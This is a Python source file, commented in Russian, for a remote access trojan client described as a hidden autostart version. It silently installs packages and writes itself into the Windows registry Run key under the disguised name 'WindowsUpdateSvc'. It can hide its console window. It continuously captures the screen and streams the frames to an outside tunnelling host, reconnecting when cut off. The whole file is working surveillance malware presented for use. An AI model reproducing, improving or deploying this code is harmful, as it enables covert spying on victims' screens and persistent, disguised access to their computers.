# rat_client.py — скрытая версия с автозапуском

import sys
import subprocess
import time
import threading
import socket
import cv2
import mss
import numpy as np
import pickle
import struct
import os
import winreg as reg   # для автозапуска

# ================== АВТОУСТАНОВКА ==================
def install_packages():
    required = ['mss', 'opencv-python', 'numpy']
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

# ================== НАСТРОЙКИ ==================
SCREEN_QUALITY = 68
MAX_WIDTH = 1280
LIVE_FPS = 20

stop_live = False

HOST = "vmwdp-2a09-bac5-31cc-319--4f-94.run.pinggy-free.link"
PORT = 44955

# ================== АВТОЗАПУСК В РЕЕСТР ==================
def add_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        reg.CloseKey(key)
        print("[+] Добавлен в автозагрузку (HKEY_CURRENT_USER)")
    except:
        pass  # если нет прав — молча

# ================== LIVE SCREEN ==================
def start_live_screen():
    global stop_live
    stop_live = False
    print("[+] LIVE SCREEN запущен в фоне")

    def live_loop():
        global stop_live
        while not stop_live:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((HOST, PORT))
                
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    while not stop_live:
                        screenshot = sct.grab(monitor)
                        frame = np.array(screenshot)
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                        h, w = frame.shape[:2]
                        if w > MAX_WIDTH:
                            frame = cv2.resize(frame, (MAX_WIDTH, int(h * MAX_WIDTH / w)), interpolation=cv2.INTER_AREA)

                        _, encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), SCREEN_QUALITY])
                        data = pickle.dumps(encoded, 0)
                        size = len(data)

                        sock.sendall(struct.pack(">L", size) + data)
                        time.sleep(1.0 / LIVE_FPS)
            except:
                time.sleep(5)  # пытаемся переподключиться
            finally:
                try:
                    sock.close()
                except:
                    pass

    threading.Thread(target=live_loop, daemon=True).start()

# ================== MAIN ==================
def main():
    install_packages()
    add_to_startup()          # добавляет себя в автозагрузку
    start_live_screen()       # сразу запускает стрим

    # Держим процесс живым
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        global stop_live
        stop_live = True

if __name__ == "__main__":
    # Если запущено с аргументом --hidden — полностью скрываем
    if "--hidden" in sys.argv:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    main()
